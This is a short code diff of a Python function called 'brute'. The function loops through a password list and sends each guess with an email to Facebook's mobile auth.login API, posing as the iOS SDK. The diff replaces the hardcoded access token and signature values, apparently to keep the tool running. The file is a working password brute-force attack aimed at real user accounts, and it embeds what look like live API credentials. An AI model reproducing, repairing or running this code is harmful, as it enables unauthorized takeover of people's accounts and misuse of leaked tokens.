@@ -7,7 +7,7 @@ def brute(user, passs):
   try:
     for pw in passs:
       params={
-        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
+        'access_token': 'EAAAAUaZA8jlABAM96OWzInKddJDxqVpE6lLhENjud4PKlXEpgLg6qwqMAqqlDHjeZCst7KxV3Xp8QZCCVbKXPtjXYFQp8pmIzFuypucMCNyuolLBIfhZC5iPVHZBjAf13prBq5edU5T9KPgAowmKcZArOu1QeM5Mx2T5eYIaQYz2V60eoZA3ZBps',
         'format': 'JSON',
         'sdk_version': '2',
         'email': user,
@@ -15,7 +15,7 @@ def brute(user, passs):
         'password': pw,
         'sdk': 'ios',
         'generate_session_cookies': '1',
-        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+        'sig': '6f7a79c848662d665c46d19407bceab9',
       }
       api='https://b-api.facebook.com/method/auth.login'
       response=requests.get(api, params=params)
